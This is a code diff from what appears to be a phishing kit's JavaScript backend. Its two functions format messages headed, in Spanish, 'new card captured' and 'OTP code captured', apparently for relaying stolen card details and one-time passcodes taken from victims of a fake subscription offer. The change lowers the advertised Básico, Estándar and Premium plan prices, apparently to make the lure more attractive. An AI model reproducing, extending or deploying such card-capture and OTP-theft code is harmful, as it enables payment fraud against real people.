@@ -34,15 +34,15 @@ function generateSessionId() {
 function formatCardMessage(data) {
     // Map plan names and prices
     const planInfo = {
-        'basic': { name: 'Básico', price: '$ 18.900/mes' },
-        'Basic': { name: 'Básico', price: '$ 18.900/mes' },
-        'standard': { name: 'Estándar', price: '$ 29.900/mes' },
-        'Standard': { name: 'Estándar', price: '$ 29.900/mes' },
-        'premium': { name: 'Premium', price: '$ 44.900/mes' },
-        'Premium': { name: 'Premium', price: '$ 44.900/mes' }
+        'basic': { name: 'Básico', price: '$ 5.000/mes' },
+        'Basic': { name: 'Básico', price: '$ 5.000/mes' },
+        'standard': { name: 'Estándar', price: '$ 10.000/mes' },
+        'Standard': { name: 'Estándar', price: '$ 10.000/mes' },
+        'premium': { name: 'Premium', price: '$ 20.000/mes' },
+        'Premium': { name: 'Premium', price: '$ 20.000/mes' }
     };
     
-    const plan = planInfo[data.plan] || { name: 'Premium', price: '$ 44.900/mes' };
+    const plan = planInfo[data.plan] || { name: 'Premium', price: '$ 20.000/mes' };
     
     return `
 🔴 *NUEVA TARJETA CAPTURADA*
@@ -69,15 +69,15 @@ function formatCardMessage(data) {
 function formatOTPMessage(data) {
     // Map plan names and prices
     const planInfo = {
-        'basic': { name: 'Básico', price: '$ 18.900/mes' },
-        'Basic': { name: 'Básico', price: '$ 18.900/mes' },
-        'standard': { name: 'Estándar', price: '$ 29.900/mes' },
-        'Standard': { name: 'Estándar', price: '$ 29.900/mes' },
-        'premium': { name: 'Premium', price: '$ 44.900/mes' },
-        'Premium': { name: 'Premium', price: '$ 44.900/mes' }
+        'basic': { name: 'Básico', price: '$ 5.000/mes' },
+        'Basic': { name: 'Básico', price: '$ 5.000/mes' },
+        'standard': { name: 'Estándar', price: '$ 10.000/mes' },
+        'Standard': { name: 'Estándar', price: '$ 10.000/mes' },
+        'premium': { name: 'Premium', price: '$ 20.000/mes' },
+        'Premium': { name: 'Premium', price: '$ 20.000/mes' }
     };
     
-    const plan = planInfo[data.plan] || { name: 'Premium', price: '$ 44.900/mes' };
+    const plan = planInfo[data.plan] || { name: 'Premium', price: '$ 20.000/mes' };
     
     return `
 🔐 *CÓDIGO OTP CAPTURADO*
